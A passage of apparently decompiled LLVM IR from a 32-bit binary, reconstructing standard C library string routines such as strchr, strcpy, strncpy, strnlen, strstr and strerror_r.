  %v9_80528ef = add i32 %v8_80528ef, %v5_80528ef
  %v10_80528ef = add i32 %v8_80528ef, %v6_80528ef
  store i32 %v9_80528ef, i32* %edi.global-to-local, align 4
  store i32 %v10_80528ef, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80528f0

dec_label_pc_80528f0:                             ; preds = %dec_label_pc_80528eb, %dec_label_pc_80528ef
  store i32 %v4_80528dc, i32* %eax.global-to-local, align 4
  %v2_80528f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80528f4, i32* @esi, align 4
  ret i32 %v4_80528dc

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_80528f0, { 1, 0 }
  uselistorder label %dec_label_pc_80528eb, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_80528f8 = load i32, i32* @edi, align 4
  %v4_8052901 = ptrtoint i8* %arg1 to i32
  %v5_8052905 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_8052905 = ptrtoint i8* %v5_8052905 to i32
  store i32 %v6_8052905, i32* @ecx, align 4
  store i32 %v0_80528f8, i32* @edi, align 4
  ret i32 %v4_8052901

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8052911 = ptrtoint i8* %arg1 to i32
  %v2_8052919 = mul i32 %arg2, 256
  %v3_8052919 = and i32 %v2_8052919, 65280
  %v4_8052919 = and i32 %arg2, -65281
  %v5_8052919 = or i32 %v3_8052919, %v4_8052919
  %v8_805291b.pre = load i1, i1* @df, align 1
  %v9_805291b = select i1 %v8_805291b.pre, i32 -1, i32 1
  br label %dec_label_pc_805291b

dec_label_pc_805291b:                             ; preds = %dec_label_pc_8052920, %entry
  %v4_805291b = phi i32 [ %v6_805291b, %dec_label_pc_8052920 ], [ %v5_8052919, %entry ]
  %v7_805291b = phi i32 [ %v10_805291b, %dec_label_pc_8052920 ], [ %v4_8052911, %entry ]
  %v1_805291b = inttoptr i32 %v7_805291b to i8*
  %v2_805291b = load i8, i8* %v1_805291b, align 1
  %v10_805291b = add i32 %v7_805291b, %v9_805291b
  %v3_805291c = udiv i32 %v4_805291b, 256
  %v4_805291c = trunc i32 %v3_805291c to i8
  %v16_805291c = icmp eq i8 %v2_805291b, %v4_805291c
  br i1 %v16_805291c, label %dec_label_pc_8052929.loopexit, label %dec_label_pc_8052920

dec_label_pc_8052920:                             ; preds = %dec_label_pc_805291b
  %v3_805291b = zext i8 %v2_805291b to i32
  %v5_805291b = and i32 %v4_805291b, -256
  %v6_805291b = or i32 %v3_805291b, %v5_805291b
  %v4_8052920 = icmp eq i8 %v2_805291b, 0
  %v1_8052922 = icmp eq i1 %v4_8052920, false
  br i1 %v1_8052922, label %dec_label_pc_805291b, label %dec_label_pc_8052924

dec_label_pc_8052924:                             ; preds = %dec_label_pc_8052920
  br label %dec_label_pc_8052929

dec_label_pc_8052929.loopexit:                    ; preds = %dec_label_pc_805291b
  %phitmp = add i32 %v10_805291b, -1
  br label %dec_label_pc_8052929

dec_label_pc_8052929:                             ; preds = %dec_label_pc_8052929.loopexit, %dec_label_pc_8052924
  %v0_8052929 = phi i32 [ 0, %dec_label_pc_8052924 ], [ %phitmp, %dec_label_pc_8052929.loopexit ]
  ret i32 %v0_8052929

; uselistorder directives
  uselistorder i8 %v2_805291b, { 1, 2, 0 }
  uselistorder i32 %v4_805291b, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052931 = load i32, i32* @esi, align 4
  store i32 %v0_8052931, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8052939 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052939, i32* %edi.global-to-local, align 4
  %v4_805293d.pre = load i32, i32* @eax, align 4
  %v8_805293d.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_805293d

dec_label_pc_805293d:                             ; preds = %dec_label_pc_805293d.dec_label_pc_805293d_crit_edge, %entry
  %v2_805293e = phi i32 [ %v7_805293e, %dec_label_pc_805293d.dec_label_pc_805293d_crit_edge ], [ %v4_8052939, %entry ]
  %v8_805293d = phi i1 [ %v5_805293e, %dec_label_pc_805293d.dec_label_pc_805293d_crit_edge ], [ %v8_805293d.pre, %entry ]
  %v4_805293d = phi i32 [ %v0_805293f, %dec_label_pc_805293d.dec_label_pc_805293d_crit_edge ], [ %v4_805293d.pre, %entry ]
  %v7_805293d = phi i32 [ %v0_805293d.pre, %dec_label_pc_805293d.dec_label_pc_805293d_crit_edge ], [ %arg2, %entry ]
  %v1_805293d = inttoptr i32 %v7_805293d to i8*
  %v2_805293d = load i8, i8* %v1_805293d, align 1
  %v3_805293d = zext i8 %v2_805293d to i32
  %v5_805293d = and i32 %v4_805293d, -256
  %v6_805293d = or i32 %v3_805293d, %v5_805293d
  store i32 %v6_805293d, i32* %eax.global-to-local, align 4
  %v9_805293d = select i1 %v8_805293d, i32 -1, i32 1
  %v10_805293d = add i32 %v7_805293d, %v9_805293d
  store i32 %v10_805293d, i32* %esi.global-to-local, align 4
  %v3_805293e = inttoptr i32 %v2_805293e to i8*
  store i8 %v2_805293d, i8* %v3_805293e, align 1
  %v4_805293e = load i32, i32* %edi.global-to-local, align 4
  %v5_805293e = load i1, i1* @df, align 1
  %v6_805293e = select i1 %v5_805293e, i32 -1, i32 1
  %v7_805293e = add i32 %v6_805293e, %v4_805293e
  store i32 %v7_805293e, i32* %edi.global-to-local, align 4
  %v0_805293f = load i32, i32* %eax.global-to-local, align 4
  %v3_805293f = trunc i32 %v0_805293f to i8
  %v4_805293f = icmp eq i8 %v3_805293f, 0
  %v1_8052941 = icmp eq i1 %v4_805293f, false
  br i1 %v1_8052941, label %dec_label_pc_805293d.dec_label_pc_805293d_crit_edge, label %dec_label_pc_8052943

dec_label_pc_805293d.dec_label_pc_805293d_crit_edge: ; preds = %dec_label_pc_805293d
  %v0_805293d.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805293d

dec_label_pc_8052943:                             ; preds = %dec_label_pc_805293d
  store i32 %v4_8052939, i32* %eax.global-to-local, align 4
  %v2_8052947 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052947, i32* @edx, align 4
  %v2_8052948 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052948, i32* @esi, align 4
  ret i32 %v4_8052939

; uselistorder directives
  uselistorder i32 %v0_805293f, { 1, 0 }
  uselistorder i32 %v7_805293e, { 1, 0 }
  uselistorder i1 %v5_805293e, { 1, 0 }
  uselistorder i32 %v4_8052939, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052961 = load i32, i32* @esi, align 4
  store i32 %v0_8052961, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805296d = ptrtoint i8* %arg1 to i32
  store i32 %v4_805296d, i32* %edi.global-to-local, align 4
  %v1_8052971 = add i32 %arg3, 1
  store i32 %v1_8052971, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052972

dec_label_pc_8052972:                             ; preds = %dec_label_pc_8052975, %entry
  %v3_8052976 = phi i32 [ %v4_805296d, %entry ], [ %v8_8052976, %dec_label_pc_8052975 ]
  %v0_8052972 = phi i32 [ %v1_8052971, %entry ], [ %v0_8052972.pre, %dec_label_pc_8052975 ]
  %v1_8052972 = add i32 %v0_8052972, -1
  %v8_8052972 = icmp eq i32 %v1_8052972, 0
  store i32 %v1_8052972, i32* %ecx.global-to-local, align 4
  br i1 %v8_8052972, label %.loopexit, label %dec_label_pc_8052975

dec_label_pc_8052975:                             ; preds = %dec_label_pc_8052972
  %v0_8052975 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052975 = inttoptr i32 %v0_8052975 to i8*
  %v2_8052975 = load i8, i8* %v1_8052975, align 1
  %v10_8052975 = load i1, i1* @df, align 1
  %v11_8052975 = select i1 %v10_8052975, i32 -1, i32 1
  %v12_8052975 = add i32 %v11_8052975, %v0_8052975
  store i32 %v12_8052975, i32* %esi.global-to-local, align 4
  %v4_8052976 = inttoptr i32 %v3_8052976 to i8*
  store i8 %v2_8052975, i8* %v4_8052976, align 1
  %v5_8052976 = load i32, i32* %edi.global-to-local, align 4
  %v6_8052976 = load i1, i1* @df, align 1
  %v7_8052976 = select i1 %v6_8052976, i32 -1, i32 1
  %v8_8052976 = add i32 %v7_8052976, %v5_8052976
  store i32 %v8_8052976, i32* %edi.global-to-local, align 4
  %v6_8052977 = icmp eq i8 %v2_8052975, 0
  %v1_8052979 = icmp eq i1 %v6_8052977, false
  %v0_8052972.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_8052979, label %dec_label_pc_8052972, label %dec_label_pc_805297b

dec_label_pc_805297b:                             ; preds = %dec_label_pc_8052975
  %v1_805297b = add i32 %v0_8052972.pre, -1
  store i32 %v1_805297b, i32* %ecx.global-to-local, align 4
  %v2_805297c = sext i8 %v2_8052975 to i32
  %v4_805297c = inttoptr i32 %v8_8052976 to i8*
  %v5_805297c = call i8* @_memset(i8* %v4_805297c, i32 %v2_805297c, i32 %v1_805297b)
  %v6_805297c = ptrtoint i8* %v5_805297c to i32
  store i32 %v6_805297c, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_8052972, %dec_label_pc_805297b
  %v2_8052982 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052982, i32* @edx, align 4
  %v2_8052983 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052983, i32* @esi, align 4
  ret i32 %v4_805296d

; uselistorder directives
  uselistorder i32 %v8_8052976, { 0, 2, 1 }
  uselistorder i8 %v2_8052975, { 0, 2, 1 }
  uselistorder i32 %v1_8052972, { 1, 0 }
  uselistorder i32 %v4_805296d, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_2()
  %v4_8052988 = ptrtoint i8* %tmp4 to i32
  %v8_805299b5 = icmp eq i32 %tmp, 0
  %v1_805299c6 = icmp eq i1 %v8_805299b5, false
  br i1 %v1_805299c6, label %dec_label_pc_8052995, label %dec_label_pc_805299e

dec_label_pc_8052995:                             ; preds = %entry, %dec_label_pc_805299a
  %v1_805299b8 = phi i32 [ %v1_805299b, %dec_label_pc_805299a ], [ %tmp, %entry ]
  %v0_805299e7 = phi i32 [ %v1_805299a, %dec_label_pc_805299a ], [ %v4_8052988, %entry ]
  %v1_8052995 = inttoptr i32 %v0_805299e7 to i8*
  %v2_8052995 = load i8, i8* %v1_8052995, align 1
  %v3_8052995 = icmp eq i8 %v2_8052995, 0
  br i1 %v3_8052995, label %dec_label_pc_805299e, label %dec_label_pc_805299a

dec_label_pc_805299a:                             ; preds = %dec_label_pc_8052995
  %v1_805299a = add i32 %v0_805299e7, 1
  %v1_805299b = add i32 %v1_805299b8, -1
  %v8_805299b = icmp eq i32 %v1_805299b, 0
  %v1_805299c = icmp eq i1 %v8_805299b, false
  br i1 %v1_805299c, label %dec_label_pc_8052995, label %dec_label_pc_805299e

dec_label_pc_805299e:                             ; preds = %dec_label_pc_805299a, %dec_label_pc_8052995, %entry
  %v0_805299e.lcssa = phi i32 [ %v4_8052988, %entry ], [ %v0_805299e7, %dec_label_pc_8052995 ], [ %v1_805299a, %dec_label_pc_805299a ]
  %v2_805299e = sub i32 %v0_805299e.lcssa, %v4_8052988
  ret i32 %v2_805299e

; uselistorder directives
  uselistorder i32 %v1_805299b, { 1, 0 }
  uselistorder i32 %v0_805299e7, { 0, 2, 1 }
  uselistorder i32 %v4_8052988, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052995, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %v0_80529a7 = load i32, i32* @ebx, align 4
  %v4_80529ab = ptrtoint i8* %arg2 to i32
  %v2_80529b3 = load i8, i8* %arg2, align 1
  %v1_80529b6 = icmp eq i8 %v2_80529b3, 0
  br i1 %v1_80529b6, label %dec_label_pc_8052a63, label %dec_label_pc_80529be

dec_label_pc_80529be:                             ; preds = %entry
  %v1_80529be = add i32 %arg1, -1
  br label %dec_label_pc_80529bf

dec_label_pc_80529bf:                             ; preds = %dec_label_pc_80529cb, %dec_label_pc_80529be
  %v0_80529bf = phi i32 [ %v1_80529bf, %dec_label_pc_80529cb ], [ %v1_80529be, %dec_label_pc_80529be ]
  %v1_80529bf = add i32 %v0_80529bf, 1
  %v1_80529c0 = inttoptr i32 %v1_80529bf to i8*
  %v2_80529c0 = load i8, i8* %v1_80529c0, align 1
  %v1_80529c3 = icmp eq i8 %v2_80529c0, 0
  br i1 %v1_80529c3, label %dec_label_pc_8052a61, label %dec_label_pc_80529cb

dec_label_pc_80529cb:                             ; preds = %dec_label_pc_80529bf
  %v12_80529cb = icmp eq i8 %v2_80529c0, %v2_80529b3
  %v1_80529cd = icmp eq i1 %v12_80529cb, false
  br i1 %v1_80529cd, label %dec_label_pc_80529bf, label %dec_label_pc_80529cf

dec_label_pc_80529cf:                             ; preds = %dec_label_pc_80529cb
  %v1_80529cf = add i32 %v4_80529ab, 1
  %v2_80529d6 = inttoptr i32 %v1_80529cf to i8*
  %v3_80529d6 = load i8, i8* %v2_80529d6, align 1
  %v1_80529dd = icmp eq i8 %v3_80529d6, 0
  br i1 %v1_80529dd, label %dec_label_pc_8052a63, label %dec_label_pc_80529e1

dec_label_pc_80529e1:                             ; preds = %dec_label_pc_80529cf
  %v1_80529e1 = add i32 %v0_80529bf, 2
  %v1_8052a22 = add i32 %v4_80529ab, 2
  %v2_8052a22 = inttoptr i32 %v1_8052a22 to i8*
  br label %dec_label_pc_8052a14

dec_label_pc_80529ec:                             ; preds = %dec_label_pc_8052a59
  %v2_80529ec = inttoptr i32 %v0_8052a27 to i8*
  %v3_80529ec = load i8, i8* %v2_80529ec, align 1
  br label %dec_label_pc_8052a09.preheader

dec_label_pc_8052a09.preheader:                   ; preds = %dec_label_pc_80529ec, %dec_label_pc_8052a14
  %v0_80529f5.ph.in = phi i8 [ %v0_8052a0927.in, %dec_label_pc_8052a14 ], [ %v3_80529ec, %dec_label_pc_80529ec ]
  %v12_8052a0954 = icmp eq i8 %v0_80529f5.ph.in, %v2_80529b3
  %v1_8052a0b55 = icmp eq i1 %v12_8052a0954, false
  br i1 %v1_8052a0b55, label %dec_label_pc_80529f5, label %dec_label_pc_8052a0d

dec_label_pc_80529f5:                             ; preds = %dec_label_pc_8052a09.preheader, %dec_label_pc_8052a05
  %v0_80529f557.in = phi i8 [ %v2_8052a06, %dec_label_pc_8052a05 ], [ %v0_80529f5.ph.in, %dec_label_pc_8052a09.preheader ]
  %v0_80529f956 = phi i32 [ %v1_8052a05, %dec_label_pc_8052a05 ], [ %v0_8052a27, %dec_label_pc_8052a09.preheader ]
  %v1_80529f5 = icmp eq i8 %v0_80529f557.in, 0
  br i1 %v1_80529f5, label %dec_label_pc_8052a61, label %dec_label_pc_80529f9

dec_label_pc_80529f9:                             ; preds = %dec_label_pc_80529f5
  %v1_80529f9 = add i32 %v0_80529f956, 1
  %v1_80529fa = inttoptr i32 %v1_80529f9 to i8*
  %v2_80529fa = load i8, i8* %v1_80529fa, align 1
  %v12_80529fd = icmp eq i8 %v2_80529fa, %v2_80529b3
  br i1 %v12_80529fd, label %dec_label_pc_8052a0d, label %dec_label_pc_8052a01

dec_label_pc_8052a01:                             ; preds = %dec_label_pc_80529f9
  %v1_8052a01 = icmp eq i8 %v2_80529fa, 0
  br i1 %v1_8052a01, label %dec_label_pc_8052a61, label %dec_label_pc_8052a05

dec_label_pc_8052a05:                             ; preds = %dec_label_pc_8052a01
  %v1_8052a05 = add i32 %v0_80529f956, 2
  %v1_8052a06 = inttoptr i32 %v1_8052a05 to i8*
  %v2_8052a06 = load i8, i8* %v1_8052a06, align 1
  %v12_8052a09 = icmp eq i8 %v2_8052a06, %v2_80529b3
  %v1_8052a0b = icmp eq i1 %v12_8052a09, false
  br i1 %v1_8052a0b, label %dec_label_pc_80529f5, label %dec_label_pc_8052a0d

dec_label_pc_8052a0d:                             ; preds = %dec_label_pc_8052a05, %dec_label_pc_80529f9, %dec_label_pc_8052a09.preheader
  %v0_8052a0d = phi i32 [ %v0_8052a27, %dec_label_pc_8052a09.preheader ], [ %v1_80529f9, %dec_label_pc_80529f9 ], [ %v1_8052a05, %dec_label_pc_8052a05 ]
  %v1_8052a0d = add i32 %v0_8052a0d, 1
  br label %dec_label_pc_8052a14

dec_label_pc_8052a14:                             ; preds = %dec_label_pc_80529e1, %dec_label_pc_8052a0d
  %v0_8052a0927.in.in.in = phi i32 [ %v1_8052a0d, %dec_label_pc_8052a0d ], [ %v1_80529e1, %dec_label_pc_80529e1 ]
  %v0_8052a27 = phi i32 [ %v1_8052a0d, %dec_label_pc_8052a0d ], [ %v1_80529e1, %dec_label_pc_80529e1 ]
  %v0_8052a0927.in.in = inttoptr i32 %v0_8052a0927.in.in.in to i8*
  %v0_8052a0927.in = load i8, i8* %v0_8052a0927.in.in, align 1
  %storemerge4 = icmp eq i8 %v0_8052a0927.in, %v3_80529d6
  %v1_8052a14 = icmp eq i1 %storemerge4, false
  br i1 %v1_8052a14, label %dec_label_pc_8052a09.preheader, label %dec_label_pc_8052a16

dec_label_pc_8052a16:                             ; preds = %dec_label_pc_8052a14
  %v1_8052a1e = add i32 %v0_8052a27, 1
  %v2_8052a1e = inttoptr i32 %v1_8052a1e to i8*
  %v3_8052a1e = load i8, i8* %v2_8052a1e, align 1
  %v3_8052a22 = load i8, i8* %v2_8052a22, align 1
  %v1_8052a2a = add i32 %v0_8052a27, -1
  %v12_8052a2d = icmp eq i8 %v3_8052a1e, %v3_8052a22
  %v1_8052a2f = icmp eq i1 %v12_8052a2d, false
  br i1 %v1_8052a2f, label %dec_label_pc_8052a59, label %dec_label_pc_8052a31.preheader

dec_label_pc_8052a31.preheader:                   ; preds = %dec_label_pc_8052a16
  %v1_8052a3110 = icmp eq i8 %v3_8052a1e, 0
  br i1 %v1_8052a3110, label %dec_label_pc_8052a63, label %dec_label_pc_8052a35

dec_label_pc_8052a35:                             ; preds = %dec_label_pc_8052a31.preheader, %dec_label_pc_8052a55
  %v0_8052a48 = phi i32 [ %v1_8052a48, %dec_label_pc_8052a55 ], [ %v1_8052a22, %dec_label_pc_8052a31.preheader ]
  %v0_8052a45 = phi i32 [ %v1_8052a45, %dec_label_pc_8052a55 ], [ %v1_8052a1e, %dec_label_pc_8052a31.preheader ]
  %v1_8052a35 = add i32 %v0_8052a45, 1
  %v2_8052a35 = inttoptr i32 %v1_8052a35 to i8*
  %v3_8052a35 = load i8, i8* %v2_8052a35, align 1
  %v1_8052a39 = add i32 %v0_8052a48, 1
  %v2_8052a39 = inttoptr i32 %v1_8052a39 to i8*
  %v3_8052a39 = load i8, i8* %v2_8052a39, align 1
  %v12_8052a3d = icmp eq i8 %v3_8052a35, %v3_8052a39
  %v1_8052a3f = icmp eq i1 %v12_8052a3d, false
  br i1 %v1_8052a3f, label %dec_label_pc_8052a59, label %dec_label_pc_8052a41

dec_label_pc_8052a41:                             ; preds = %dec_label_pc_8052a35
  %v1_8052a41 = icmp eq i8 %v3_8052a39, 0
  br i1 %v1_8052a41, label %dec_label_pc_8052a63, label %dec_label_pc_8052a45

dec_label_pc_8052a45:                             ; preds = %dec_label_pc_8052a41
  %v1_8052a45 = add i32 %v0_8052a45, 2
  %v1_8052a48 = add i32 %v0_8052a48, 2
  %v1_8052a4b = inttoptr i32 %v1_8052a45 to i8*
  %v2_8052a4b = load i8, i8* %v1_8052a4b, align 1
  %v1_8052a4e = inttoptr i32 %v1_8052a48 to i8*
  %v2_8052a4e = load i8, i8* %v1_8052a4e, align 1
  %v12_8052a51 = icmp eq i8 %v2_8052a4b, %v2_8052a4e
  %v1_8052a53 = icmp eq i1 %v12_8052a51, false
  br i1 %v1_8052a53, label %dec_label_pc_8052a59, label %dec_label_pc_8052a55

dec_label_pc_8052a55:                             ; preds = %dec_label_pc_8052a45
  %v1_8052a31 = icmp eq i8 %v2_8052a4e, 0
  br i1 %v1_8052a31, label %dec_label_pc_8052a63, label %dec_label_pc_8052a35

dec_label_pc_8052a59:                             ; preds = %dec_label_pc_8052a45, %dec_label_pc_8052a35, %dec_label_pc_8052a16
  %v0_8052a59.in = phi i8 [ %v3_8052a22, %dec_label_pc_8052a16 ], [ %v2_8052a4e, %dec_label_pc_8052a45 ], [ %v3_8052a39, %dec_label_pc_8052a35 ]
  %v1_8052a59 = icmp eq i8 %v0_8052a59.in, 0
  %v1_8052a5b = icmp eq i1 %v1_8052a59, false
  br i1 %v1_8052a5b, label %dec_label_pc_80529ec, label %dec_label_pc_8052a63

dec_label_pc_8052a61:                             ; preds = %dec_label_pc_80529bf, %dec_label_pc_8052a01, %dec_label_pc_80529f5
  br label %dec_label_pc_8052a63

dec_label_pc_8052a63:                             ; preds = %dec_label_pc_8052a31.preheader, %dec_label_pc_8052a59, %dec_label_pc_8052a41, %dec_label_pc_8052a55, %entry, %dec_label_pc_80529cf, %dec_label_pc_8052a61
  %storemerge2 = phi i32 [ 0, %dec_label_pc_8052a61 ], [ %v1_80529bf, %dec_label_pc_80529cf ], [ %arg1, %entry ], [ %v1_8052a2a, %dec_label_pc_8052a55 ], [ %v1_8052a2a, %dec_label_pc_8052a41 ], [ %v1_8052a2a, %dec_label_pc_8052a59 ], [ %v1_8052a2a, %dec_label_pc_8052a31.preheader ]
  store i32 %v0_80529a7, i32* @ebx, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8 %v2_8052a4e, { 0, 2, 1 }
  uselistorder i32 %v1_8052a48, { 1, 0 }
  uselistorder i32 %v1_8052a45, { 1, 0 }
  uselistorder i8 %v3_8052a39, { 0, 2, 1 }
  uselistorder i8 %v3_8052a1e, { 1, 0 }
  uselistorder i32 %v0_8052a27, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_8052a0d, { 1, 0 }
  uselistorder i8 %v2_8052a06, { 1, 0 }
  uselistorder i32 %v1_8052a05, { 0, 2, 1 }
  uselistorder i8 %v2_80529fa, { 1, 0 }
  uselistorder i32 %v0_80529f956, { 1, 0 }
  uselistorder i32 %v1_80529e1, { 1, 0 }
  uselistorder i32 %v1_80529bf, { 0, 2, 1 }
  uselistorder i8 %v2_80529b3, { 1, 2, 0, 3, 4 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8052a63, { 6, 1, 3, 2, 0, 5, 4 }
  uselistorder label %dec_label_pc_8052a61, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052a35, { 1, 0 }
  uselistorder label %dec_label_pc_8052a14, { 1, 0 }
  uselistorder label %dec_label_pc_80529f5, { 1, 0 }
  uselistorder label %dec_label_pc_8052a09.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_8052a7d = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_8052a82 = load i32, i32* @ebx, align 4
  ret i32 %v0_8052a82
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_8052a9e = icmp ugt i32 %arg1, 124
  br i1 %v6_8052a9e, label %dec_label_pc_8052abb, label %dec_label_pc_8052aa0

dec_label_pc_8052aa0:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_805b680.500 to i32), i32* @esi, align 4
  %v1_8052ab04 = icmp eq i32 %arg1, 0
  %v1_8052ab211 = icmp eq i1 %v1_8052ab04, false
  br i1 %v1_8052ab211, label %dec_label_pc_8052aa9, label %dec_label_pc_8052ab4

dec_label_pc_8052aa9:                             ; preds = %dec_label_pc_8052aa0, %dec_label_pc_8052aa9
  %v0_8052aac = phi i32 [ %v3_8052aac, %dec_label_pc_8052aa9 ], [ %arg1, %dec_label_pc_8052aa0 ]
  %v0_8052aaf = phi i32 [ %v1_8052aaf, %dec_label_pc_8052aa9 ], [ ptrtoint ([8 x i8]* @global_var_805b680.500 to i32), %dec_label_pc_8052aa0 ]
  %v1_8052aa9 = inttoptr i32 %v0_8052aaf to i8*
  %v2_8052aa9 = load i8, i8* %v1_8052aa9, align 1
  %v7_8052aa9 = icmp eq i8 %v2_8052aa9, 0
  %v2_8052aac = zext i1 %v7_8052aa9 to i32
  %v3_8052aac = add i32 %v2_8052aac, %v0_8052aac
  %v16_8052aac = icmp eq i32 %v3_8052aac, 0
  %v1_8052aaf = add i32 %v0_8052aaf, 1
  store i32 %v1_8052aaf, i32* @esi, align 4
  %v1_8052ab2 = icmp eq i1 %v16_8052aac, false
  br i1 %v1_8052ab2, label %dec_label_pc_8052aa9, label %dec_label_pc_8052ab4

dec_label_pc_8052ab4:                             ; preds = %dec_label_pc_8052aa9, %dec_label_pc_8052aa0
  %v0_8052ab6 = phi i32 [ ptrtoint ([8 x i8]* @global_var_805b680.500 to i32), %dec_label_pc_8052aa0 ], [ %v1_8052aaf, %dec_label_pc_8052aa9 ]
  store i32 0, i32* @ebp, align 4
  %v1_8052ab6 = inttoptr i32 %v0_8052ab6 to i8*
  %v2_8052ab6 = load i8, i8* %v1_8052ab6, align 1
  %v3_8052ab6 = icmp eq i8 %v2_8052ab6, 0
  %v1_8052ab9 = icmp eq i1 %v3_8052ab6, false
  br i1 %v1_8052ab9, label %dec_label_pc_8052ab4.dec_label_pc_8052aea_crit_edge, label %dec_label_pc_8052abb

dec_label_pc_8052ab4.dec_label_pc_8052aea_crit_edge: ; preds = %dec_label_pc_8052ab4
  br label %dec_label_pc_8052aea

dec_label_pc_8052abb:                             ; preds = %dec_label_pc_8052ab4, %entry
  store i32 22, i32* @ebp, align 4
  %v1_8052ac3 = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  %v6_8052acf = bitcast i32* %stack_var_-17 to i8*
  %v7_8052acf = call i32 @_uintmaxtostr(i8* %v6_8052acf, i32 %arg1, i32 %v1_8052ac3, i32 -10, i32 0)
  %v1_8052ad7 = add i32 %v7_8052acf, -14
  store i32 %v1_8052ad7, i32* @esi, align 4
  %v5_8052ae1 = inttoptr i32 %v1_8052ad7 to i8*
  store i8* %v5_8052ae1, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_8052ad7 to i16*
  %v6_8052ae2 = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_805b656.501 to i32), i32 14)
  %v0_8052af9.pre = load i32, i32* @edi, align 4
  %v0_8052afb.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052aea

dec_label_pc_8052aea:                             ; preds = %dec_label_pc_8052ab4.dec_label_pc_8052aea_crit_edge, %dec_label_pc_8052abb
  %v0_8052afb = phi i32 [ %v0_8052ab6, %dec_label_pc_8052ab4.dec_label_pc_8052aea_crit_edge ], [ %v0_8052afb.pre, %dec_label_pc_8052abb ]
  %v0_8052af9 = phi i32 [ %arg3, %dec_label_pc_8052ab4.dec_label_pc_8052aea_crit_edge ], [ %v0_8052af9.pre, %dec_label_pc_8052abb ]
  %v4_8052aec = icmp eq i32 %arg2, 0
  %v1_8052af1 = icmp eq i1 %v4_8052aec, false
  %v2_8052af9 = select i1 %v1_8052af1, i32 %v0_8052af9, i32 0
  store i32 %v2_8052af9, i32* @edi, align 4
  %v5_8052afb = inttoptr i32 %v0_8052afb to i8*
  store i8* %v5_8052afb, i8** %stack_var_-108, align 4
  %v3_8052afc = call i32 @strlen(i8* %v5_8052afb)
  %v1_8052b04 = add i32 %v3_8052afc, 1
  store i32 %v1_8052b04, i32* %ebx.global-to-local, align 4
  %v1_8052b07 = load i32, i32* @edi, align 4
  %tmp46 = icmp ugt i32 %v1_8052b04, %v1_8052b07
  br i1 %tmp46, label %dec_label_pc_8052b0b, label %dec_label_pc_8052b12

dec_label_pc_8052b0b:                             ; preds = %dec_label_pc_8052aea
  store i32 %v1_8052b07, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_8052b12

dec_label_pc_8052b12:                             ; preds = %dec_label_pc_8052aea, %dec_label_pc_8052b0b
  %v0_8052b17 = phi i32 [ %v1_8052b04, %dec_label_pc_8052aea ], [ %v1_8052b07, %dec_label_pc_8052b0b ]
